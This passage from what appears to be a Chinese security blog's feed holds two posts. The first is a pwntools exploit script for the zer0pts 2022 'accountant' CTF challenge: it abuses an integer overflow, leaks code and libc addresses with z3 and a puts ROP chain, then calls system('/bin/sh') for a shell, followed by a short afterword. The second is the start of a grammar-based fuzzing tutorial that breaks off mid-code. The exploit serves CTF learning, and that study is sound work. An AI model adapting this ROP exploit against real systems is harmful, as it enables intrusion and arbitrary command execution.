title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./chall&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;./libc-2.31.so&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment"># cmd +=&quot;brva 0xA5B\n&quot; # break at calling input_all_data(items, n);</span></span><br><span class="line">    <span class="comment"># cmd +=&quot;brva 0xB3D\n&quot; #break at alloca ,which cause overflow</span></span><br><span class="line">    cmd +=<span class="string">&quot;brva 0x0C5F\n&quot;</span> <span class="comment"># break at ret</span></span><br><span class="line">    <span class="comment"># cmd +=&quot;brva 0xA85\n&quot; # break at calc_total, to see how to leak</span></span><br><span class="line">    <span class="comment"># cmd +=&quot;brva 0xA43\n&quot; # break at write stack</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">total</span>):</span><br><span class="line">    high = BitVec(<span class="string">&quot;high&quot;</span>,<span class="number">16</span>)</span><br><span class="line">    mid = BitVec(<span class="string">&quot;mid&quot;</span>,<span class="number">20</span>)</span><br><span class="line">    low = BitVecVal(<span class="number">0xb6c</span>,<span class="number">32</span>)</span><br><span class="line">    solver = Solver()</span><br><span class="line">    solver.add(high&gt;=<span class="number">0x5500</span>)</span><br><span class="line">    solver.add(high&lt;=<span class="number">0x56ff</span>)</span><br><span class="line">    mid_low = (ZeroExt(<span class="number">12</span>,mid)&lt;&lt;<span class="number">12</span>)+low</span><br><span class="line">    solver.add((mid_low*ZeroExt(<span class="number">16</span>,high)) == total)</span><br><span class="line">    solver.check()</span><br><span class="line">    m = solver.model()</span><br><span class="line">    mid_ans = <span class="built_in">int</span>(<span class="built_in">str</span>(m.evaluate(mid)))</span><br><span class="line">    high_ans = <span class="built_in">int</span>(<span class="built_in">str</span>(m.evaluate(high)))</span><br><span class="line">    <span class="comment"># print(&quot;mid: %x&quot; % mid_ans)</span></span><br><span class="line">    <span class="comment"># print(&quot;high: %x&quot; % high_ans)</span></span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    ans  = ans + (high_ans &lt;&lt; <span class="number">32</span>)</span><br><span class="line">    ans  = ans + (mid_ans &lt;&lt; <span class="number">12</span>)</span><br><span class="line">    ans  = ans +<span class="number">0xb6c</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ans: %x&quot;</span> % ans)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_rop</span>(<span class="params">payload</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    base = <span class="number">11</span> <span class="comment"># offset from calloced to stack ret addr</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Would you like to fix data? [1=Yes] &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span>(i+base&lt;<span class="built_in">len</span>(payload)+base):</span><br><span class="line">        io.recvuntil(<span class="string">&#x27;Index to modify (-1 to quit): &#x27;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(i+base))</span><br><span class="line">        io.recvuntil(<span class="string">&#x27;  Price: $&#x27;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(payload[i]&amp;<span class="number">0xffffffff</span>))</span><br><span class="line">        <span class="comment"># success(&quot;time &quot; + str(i) + &quot; &quot; + &quot;%08d&quot;%(payload[i]&amp;0xffffffff))</span></span><br><span class="line">        io.recvuntil(<span class="string">&#x27;  Quantity: &#x27;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(payload[i]&gt;&gt;<span class="number">32</span>))</span><br><span class="line">        <span class="comment"># success(&quot;time &quot; + str(i) + &quot; &quot; + str((payload[i]&amp;0xffffffff00000000)&gt;&gt;32))</span></span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index to modify (-1 to quit): &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Number of items: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">&#x27;0x2000000000000000&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Total: $&#x27;</span>)</span><br><span class="line">value = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">success(<span class="string">&quot;get value: &quot;</span> + <span class="built_in">hex</span>(value))</span><br><span class="line">code_info = solve(value)</span><br><span class="line">code_base = code_info - <span class="number">0x000b6c</span></span><br><span class="line">success(<span class="string">&quot;code_base: &quot;</span> + <span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP --- getlibc</span></span><br><span class="line"><span class="comment"># puts(puts@got)</span></span><br><span class="line">payload = []</span><br><span class="line">pop_rdi = <span class="number">0x0000000000000d53</span> + code_base</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>] + code_base</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>] + code_base</span><br><span class="line">main = <span class="number">0xAAD</span>+code_base</span><br><span class="line">success(<span class="built_in">hex</span>(pop_rdi))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">payload.append(pop_rdi)</span><br><span class="line">payload.append(puts_got)</span><br><span class="line">payload.append(puts_plt)</span><br><span class="line">payload.append(main)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">my_rop(payload)</span><br><span class="line">libc_info = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = libc_info - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Number of items: &#x27;</span>)</span><br><span class="line">io.send(<span class="string">&#x27;0x2000000000000000&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Total: $&#x27;</span>)</span><br><span class="line"><span class="comment"># ROP --- getshell</span></span><br><span class="line">binsh = libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__() + libc_base</span><br><span class="line">payload = []</span><br><span class="line">payload.append(pop_rdi)</span><br><span class="line">payload.append(binsh)</span><br><span class="line">payload.append(<span class="number">0x00000000000007be</span>+code_base) <span class="comment"># ret to make stack average</span></span><br><span class="line">payload.append(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">my_rop(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2022/03/29/zer0pts2022-accountant/image-20220330231054523.png" alt="image-20220330231054523"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这个题代码量很少，但是只有9个队伍做了出来，说明漏洞点还是十分隐蔽。关键的premititive是抓住我们能够在栈上分配可控空间这一点，这一点十分危险，并且可能和<strong>整数溢出</strong>关系很大。因为栈上一般都是根据用户输入分配空间(如果可控)。并且能够想到用brute-force或者z3解决地址泄露的问题。是一道简短但是不可多得的好题。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack </tag>
            
            <tag> int_overflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fuzzing-6-grammer_fuzzing</title>
      <link href="/2022/03/17/fuzzing-6-grammer-fuzzing/"/>
      <url>/2022/03/17/fuzzing-6-grammer-fuzzing/</url>
      
        <content type="html"><![CDATA[<p>基于语法的fuzzing，主要面向黑盒测试。个人觉得这种方式可以再结合覆盖率动态调整演变方向，并且可以结合AI中的进化算法，演变出coverage更高的输入。</p><span id="more"></span><h1 id="输入的语法"><a href="#输入的语法" class="headerlink" title="输入的语法"></a>输入的语法</h1><p>我们的所有”输入”都可以看作是语法构成的。无论是网络上的URL，计算器中的输入计算式，又或者是交互式程序中的输入，都有一定的<code>格式</code>。接下来假设所有的程序只有一种输入方式。</p><p>我们可以把有限状态机和常见语法结合起来，让它产生有意义的数据。我们称表达式和有限状态图灵机之间的联系为<strong>语法</strong>。下面介绍几个简单的例子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;start&gt; ::= &lt;digit&gt;&lt;digit&gt;</span><br><span class="line">&lt;digit&gt; ::= 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9</span><br></pre></td></tr></table></figure><p>上面的式子就是一个简单的<strong>语法</strong>例子。为了生成一个<code>start</code>，我们先将他替换成<code>&lt;digit&gt;&lt;digit&gt;</code>，之后看到最左边有一个位置的用尖括号包裹起来的<code>&lt;digit&gt;</code>，我们需要继续递归。看到下一行是<code>&lt;digit&gt;</code>的内容，并且没有尖括号，此时我们称<code>digit</code>碰到了<code>terminal</code>，也就是终止于此。那么digit就被赋值成一个数字，传递到上面。我们如果选择了”1”，那么<code>&lt;start&gt;</code>将变为1<code>&lt;digit&gt;</code>.递归运行第二步，从而得到一个完整的<code>&lt;start&gt;</code>。</p><p>介绍完例子，正式介绍一下定义</p><blockquote><p>To read such a grammar, start with the start symbol (<code>&lt;start&gt;</code>).  An expansion rule <code>&lt;A&gt; ::= &lt;B&gt;</code> means that the symbol on the left side (<code>&lt;A&gt;</code>) can be replaced by the string on the right side (<code>&lt;B&gt;</code>).  In the above grammar, <code>&lt;start&gt;</code> would be replaced by <code>&lt;digit&gt;&lt;digit&gt;</code></p></blockquote><p>上述定义可以是<em>递归的</em>。考虑下面的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;start&gt;  ::= &lt;integer&gt;</span><br><span class="line">&lt;integer&gt; ::= &lt;digit&gt; | &lt;digit&gt;&lt;integer&gt;</span><br><span class="line">&lt;digit&gt;   ::= 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9</span><br></pre></td></tr></table></figure><p>第二行中<code>&lt;interger&gt;</code>生成了一个包含自己的表达式。虽然理论上来说，这种表达式可能无限扩张下去，我们可以设置一个演变值域，让这种变化限制在一个变异次数范围之内。</p><p>考虑下面的问题，可以看到式子中不可能出现两个加减符号，也没有出现小数点。选项就很简单了。</p><p><img src="/2022/03/17/fuzzing-6-grammer-fuzzing/image-20220317215559023.png" alt="image-20220317215559023"></p><h2 id="实例：数学表达式"><a href="#实例：数学表达式" class="headerlink" title="实例：数学表达式"></a>实例：数学表达式</h2><p>接下来，考虑一些更加实际的问题。例如<strong>数学表达式的语法</strong>，作为一个递归演算的练习。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;start&gt;   ::= &lt;expr&gt;</span><br><span class="line">&lt;expr&gt;    ::= &lt;term&gt; + &lt;expr&gt; | &lt;term&gt; - &lt;expr&gt; | &lt;term&gt;</span><br><span class="line">&lt;term&gt;    ::= &lt;term&gt; * &lt;factor&gt; | &lt;term&gt; / &lt;factor&gt; | &lt;factor&gt;</span><br><span class="line">&lt;factor&gt;  ::= +&lt;factor&gt; | -&lt;factor&gt; | (&lt;expr&gt;) | &lt;integer&gt; | &lt;integer&gt;.&lt;integer&gt;</span><br><span class="line">&lt;integer&gt; ::= &lt;digit&gt;&lt;integer&gt; | &lt;digit&gt;</span><br><span class="line">&lt;digit&gt;   ::= 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9</span><br></pre></td></tr></table></figure><p><img src="/2022/03/17/fuzzing-6-grammer-fuzzing/image-20220317215958615.png" alt="image-20220317215958615"></p><h2 id="在python中编写语法"><a href="#在python中编写语法" class="headerlink" title="在python中编写语法"></a>在python中编写语法</h2><p>使用python的map，可以轻松的建立一种<strong>字符串-列表</strong>映射表，也就是我们的语法。一个例子如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">EXPR_GRAMMAR: Grammar = &#123;</span><br><span class="line">    <span class="string">&quot;&lt;start&gt;&quot;</span>:</span><br><span class="line">        [<span class="string">&quot;&lt;expr&gt;&quot;</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&lt;expr&gt;&quot;</span>:</span><br><span class="line">        [<span class="string">&quot;&lt;term&gt; + &lt;expr&gt;&quot;</span>, <span class="string">&quot;&lt;term&gt; - &lt;expr&gt;&quot;</span>, <span class="string">&quot;&lt;term&gt;&quot;</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&lt;term&gt;&quot;</span>:</span><br><span class="line">        [<span class="string">&quot;&lt;factor&gt; * &lt;term&gt;&quot;</span>, <span class="string">&quot;&lt;factor&gt; / &lt;term&gt;&quot;</span>, <span class="string">&quot;&lt;factor&gt;&quot;</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&lt;factor&gt;&quot;</span>:</span><br><span class="line">        [<span class="string">&quot;+&lt;factor&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;-&lt;factor&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;(&lt;expr&gt;)&quot;</span>,</span><br><span class="line">         <span class="string">&quot;&lt;integer&gt;.&lt;integer&gt;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;&lt;integer&gt;&quot;</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&lt;integer&gt;&quot;</span>:</span><br><span class="line">        [<span class="string">&quot;&lt;digit&gt;&lt;integer&gt;&quot;</span>, <span class="string">&quot;&lt;digit&gt;&quot;</span>],</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&lt;digit&gt;&quot;</span>:</span><br><span class="line">        [<span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于map属性，使用下列方法可以轻松的获取某个grammar列中的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXPR_GRAMMAR[&quot;&lt;digit&gt;&quot;]</span><br><span class="line">输出: [&#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;]</span><br></pre></td></tr></table></figure><p>我们定义：非终止(non-terminal)是指<strong>不是以左右的尖括号作为开始和结束的</strong>表达式。以下表示了一些表达式类型。左侧为输入列表，右侧为输出的<strong>非终止</strong>类型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assert nonterminals(&quot;&lt;term&gt; * &lt;factor&gt;&quot;) == [&quot;&lt;term&gt;&quot;, &quot;&lt;factor&gt;&quot;]</span><br><span class="line">assert nonterminals(&quot;&lt;digit&gt;&lt;integer&gt;&quot;) == [&quot;&lt;digit&gt;&quot;, &quot;&lt;integer&gt;&quot;]</span><br><span class="line">assert nonterminals(&quot;1 &lt; 3 &gt; 2&quot;) == []</span><br><span class="line">assert nonterminals(&quot;1 &lt;3&gt; 2&quot;) == [&quot;&lt;3&gt;&quot;]</span><br><span class="line">assert nonterminals(&quot;1 + 2&quot;) == []</span><br><span class="line">assert nonterminals((&quot;&lt;1&gt;&quot;, &#123;&#x27;option&#x27;: &#x27;value&#x27;&#125;)) == [&quot;&lt;1&gt;&quot;]</span><br></pre></td></tr></table></figure><h2 id="一个简单的grammer-fuzzer"><a href="#一个简单的grammer-fuzzer" class="headerlink" title="一个简单的grammer fuzzer"></a>一个简单的grammer fuzzer</h2><p>我是一只小懒虫，我把代码复制到这里，然后分析一下，✌</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">simple_grammar_fuzzer</span>(<span class="params">grammar: Grammar, </span></span><br><span class="line"><span class="params">                          start_symbol: <span class="built_in">str</span> = START_SYMBOL,</span></span><br><span class="line"><span class="params">                          max_nonterminals: <span class="built_in">int</span> = <span class="number">10</span>,</span></span><br><span class="line"><span class="params">                          max_expansion_trials: <span class="built_in">int</span> = <span class="number">100</span>,</span></span><br><span class="line"><span class="params">                          log: <span class="built_in">bool</span> = <span class="literal">False</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Produce a string from `grammar`.</span></span><br><span class="line"><span class="string">       `start_symbol`: use a start symbol other than `&lt;start&gt;` (default).</span></span><br><span class="line"><span class="string">       `max_nonterminals`: the maximum number of nonterminals </span></span><br><span class="line"><span class="string">         still left for expansion</span></span><br><span class="line"><span class="string">       `max_expansion_trials`: maximum # of attempts to produce a string</span></span><br><span class="line"><span class="string">       `log`: print expansion progress if True&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    term = start_symbol</span><br><span class="line">    expansion_trials = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 当术语中还有非终止符号的时候</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(nonterminals(term)) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># 从术语中所有非终止符中挑选一个扩展。这里和之前讲的有顺序的扩展不太一样。</span></span><br><span class="line">        symbol_to_expand = random.choice(nonterminals(term))</span><br><span class="line">        <span class="comment"># grammar是之前我们写的map类型的规则，作为参数传递进这个类，在这里引用，并找到这个key对应的expansion种类。</span></span><br><span class="line">        expansions = grammar[symbol_to_expand]</span><br><span class="line">        <span class="comment"># 从这个key的所有expansion中随机找到一个</span></span><br><span class="line">        expansion = random.choice(expansions)</span><br><span class="line">        <span class="comment"># In later chapters, we allow expansions to be tuples,</span></span><br><span class="line">        <span class="comment"># with the expansion being the first element</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(expansion, <span class="built_in">tuple</span>):</span><br><span class="line">            expansion = expansion[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 将随机选取的扩展替换之前的</span></span><br><span class="line">        new_term = term.replace(symbol_to_expand, expansion, <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 这里是防止非术语过多导致爆栈问题。设置了一个非术语数量上限。如果小于上线，就将术语替换成刚才换掉的，否则expansion_trials++，表示超出一次。如果超出多次，就直接停止计算。</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(nonterminals(new_term)) &lt; max_nonterminals:</span><br><span class="line">            term = new_term</span><br><span class="line">            <span class="keyword">if</span> log:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;%-40s&quot;</span> % (symbol_to_expand + <span class="string">&quot; -&gt; &quot;</span> + expansion), term)</span><br><span class="line">            expansion_trials = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            expansion_trials += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> expansion_trials &gt;= max_expansion_trials:</span><br><span class="line">                <span class="keyword">raise</span> ExpansionError(<span class="string">&quot;Cannot expand &quot;</span> + <span class="built_in">repr</span>(term))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> term</span><br></pre></td></tr></table></figure><p>用如下方式调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simple_grammar_fuzzer(grammar=EXPR_GRAMMAR, max_nonterminals=3, log=True)</span><br></pre></td></tr></table></figure><p>如下，可以生成很多很有意思的算式。但是更重要的是，这和基于变异的生成方式不同。这里给随机性加上了一定的规则，不能随机变成别的内容比如字母等。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">7 / +48.5</span><br><span class="line">-5.9 / 9 - 4 * +-(-+++((1 + (+7 - (-1 * (++-+7.7 - -+-4.0))))) * +--4 - -(6) + 64)</span><br><span class="line">8.2 - 27 - -9 / +((+9 * --2 + --+-+-((-1 * +(8 - 5 - 6)) * (-((-+(((+(4))))) - ++4) / +(-+---((5.6 - --(3 * -1.8 * +(6 * +-(((-(-6) * ---+6)) / +--(+-+-7 * (-0 * (+(((((2)) + 8 - 3 - ++9.0 + ---(--+7 / (1 / +++6.37) + (1) / 482) / +++-+0)))) * -+5 + 7.513)))) - (+1 / ++((-84)))))))) * ++5 / +-(--2 - -++-9.0)))) / 5 * --++090</span><br><span class="line">1 - -3 * 7 - 28 / 9</span><br><span class="line">(+9) * +-5 * ++-926.2 - (+9.03 / -+(-(-6) / 2 * +(-+--(8) / -(+1.0) - 5 + 4)) * 3.5)</span><br><span class="line">8 + -(9.6 - 3 - -+-4 * +77)</span><br><span class="line">-(((((++((((+((++++-((+-37))))))))))))) / ++(-(+++(+6)) * -++-(+(++(---6 * (((7)) * (1) / (-7.6 * 535338) + +256) * 0) * 0))) - 4 + +1</span><br><span class="line">5.43</span><br><span class="line">(9 / -405 / -23 - +-((+-(2 * (13))))) + +6 - +8 - 934</span><br><span class="line">-++2 - (--+715769550) / 8 / (1)</span><br></pre></td></tr></table></figure><p>但是这样的缺点也有很多。比如说，可能包含很多字符串搜索、替换工作等。(或许考法一种面向语法的编译器可以解决问题?)</p><p><img src="/2022/03/17/fuzzing-6-grammer-fuzzing/image-20220317230102013.png" alt="image-20220317230102013"></p><h1 id="更多语法例子"><a href="#更多语法例子" class="headerlink" title="更多语法例子"></a>更多语法例子</h1><p>这里放一个比较有趣的吧。比如说下面的例子，可以用来生成书名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">TITLE_GRAMMAR: Grammar = &#123;</span><br><span class="line">    <span class="string">&quot;&lt;start&gt;&quot;</span>: [<span class="string">&quot;&lt;title&gt;&quot;</span>],</span><br><span class="line">    <span class="string">&quot;&lt;title&gt;&quot;</span>: [<span class="string">&quot;&lt;topic&gt;: &lt;subtopic&gt;&quot;</span>],</span><br><span class="line">    <span class="string">&quot;&lt;topic&gt;&quot;</span>: [<span class="string">&quot;Generating Software Tests&quot;</span>, <span class="string">&quot;&lt;fuzzing-prefix&gt;Fuzzing&quot;</span>, <span class="string">&quot;The Fuzzing Book&quot;</span>],</span><br><span class="line">    <span class="string">&quot;&lt;fuzzing-prefix&gt;&quot;</span>: [<span class="string">&quot;&quot;</span>, <span class="string">&quot;The Art of &quot;</span>, <span class="string">&quot;The Joy of &quot;</span>],</span><br><span class="line">    <span class="string">&quot;&lt;subtopic&gt;&quot;</span>: [<span class="string">&quot;&lt;subtopic-main&gt;&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;&lt;subtopic-prefix&gt;&lt;subtopic-main&gt;&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;&lt;subtopic-main&gt;&lt;subtopic-suffix&gt;&quot;</span>],</span><br><span class="line">    <span class="string">&quot;&lt;subtopic-main&gt;&quot;</span>: [<span class="string">&quot;Breaking Software&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;Generating Software Tests&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;Principles, Techniques and Tools&quot;</span>],</span><br><span class="line">    <span class="string">&quot;&lt;subtopic-prefix&gt;&quot;</span>: [<span class="string">&quot;&quot;</span>, <span class="string">&quot;Tools and Techniques for &quot;</span>],</span><br><span class="line">    <span class="string">&quot;&lt;subtopic-suffix&gt;&quot;</span>: [<span class="string">&quot; for &lt;reader-property&gt; and &lt;reader-property&gt;&quot;</span>,</span><br><span class="line">                          <span class="string">&quot; for &lt;software-property&gt; and &lt;software-property&gt;&quot;</span>],</span><br><span class="line">    <span class="string">&quot;&lt;reader-property&gt;&quot;</span>: [<span 